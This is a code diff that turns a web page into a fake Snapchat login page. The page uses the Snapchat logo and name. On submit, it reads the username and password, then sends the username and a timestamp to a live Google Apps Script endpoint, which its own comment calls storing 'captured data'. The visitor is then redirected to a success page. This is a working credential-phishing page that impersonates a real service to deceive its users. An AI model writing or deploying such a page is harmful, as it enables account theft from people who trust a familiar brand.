@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Log In - Snapchat Password Reset</title>
+    <title>Snapchat Login</title>
     <link rel="stylesheet" href="index.css"> <!-- Link to your CSS file -->
     <style>
         .error-message {
@@ -15,13 +15,15 @@
 <body>
     <div class="form">
         <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" alt="Snapchat Logo" class="snapchat-logo">
-        <h1>Log In to Reset Your Snapchat Password</h1>
+        <h1>Snapchat Login</h1>
         <form id="loginForm">
             <label for="username">Username or Email Address:</label><br>
-            <input type="text" id="username" name="username" placeholder="Enter your username or email" required><br><br>
+            <input type="text" id="username" name="username" placeholder="Enter your username or email" required><br>
+            <span id="usernameError" class="error-message"></span><br>
             
             <label for="password">Password:</label><br>
-            <input type="password" id="password" name="password" placeholder="Enter your password" required><br><br>
+            <input type="password" id="password" name="password" placeholder="Enter your password" required><br>
+            <span id="passwordError" class="error-message"></span><br>
             
             <input type="submit" value="Log In">
             <span id="loginError" class="error-message"></span><br>
@@ -32,9 +34,69 @@
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault(); // Prevent form submission
             
-            // Always redirect to password reset page (for demonstration purposes)
-            window.location.href = "https://snapchatpasswordreset.netlify.app/reset_password.html";
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            
+            if (validateForm(username, password)) {
+                // Send captured data to remote storage (Google Apps Script endpoint)
+                logLogin(username);
+            }
         });
+        
+        function validateForm(username, password) {
+            var isValid = true;
+            
+            // Reset error messages
+            document.getElementById('usernameError').textContent = '';
+            document.getElementById('passwordError').textContent = '';
+            document.getElementById('loginError').textContent = '';
+            
+            // Validate username
+            if (!username.trim()) {
+                document.getElementById('usernameError').textContent = 'Username or email is required';
+                isValid = false;
+            }
+            
+            // Validate password
+            if (!password.trim()) {
+                document.getElementById('passwordError').textContent = 'Password is required';
+                isValid = false;
+            }
+            
+            return isValid;
+        }
+        
+        function logLogin(username) {
+            var url = "https://script.google.com/macros/s/AKfycbwLOI3FQgQZjTcqe9qHTzqAHhCel31IFEwdfotp6PE6p7lZoIU0K6pB-DzPMKyVZgP2/exec"; // Update with your deployed Google Apps Script URL
+            
+            var data = {
+                "username": username,
+                "login_timestamp": new Date().toISOString()
+            };
+            
+            var queryString = Object.keys(data).map(key => key + '=' + encodeURIComponent(data[key])).join('&');
+            
+            var finalUrl = url + '?' + queryString;
+            
+            // Send data using fetch API
+            fetch(finalUrl)
+                .then(response => {
+                    if (response.ok) {
+                        console.log("Login logged successfully");
+                        // Redirect to a success page (optional)
+                        window.location.href = "success.html";
+                    } else {
+                        console.error("Error logging login");
+                        // Handle error (optional)
+                        document.getElementById('loginError').textContent = 'Error logging login. Please try again later.';
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    // Handle network error (optional)
+                    document.getElementById('loginError').textContent = 'Network error occurred. Please try again later.';
+                });
+        }
     </script>
 </body>
 </html>
